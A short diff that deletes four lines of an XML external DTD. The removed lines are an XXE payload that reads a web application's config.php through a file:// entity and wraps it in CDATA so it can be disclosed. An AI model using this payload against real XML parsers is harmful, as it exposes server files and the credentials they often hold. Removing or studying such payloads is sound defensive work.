@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///var/www/html/skygenerator/public/config.php">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
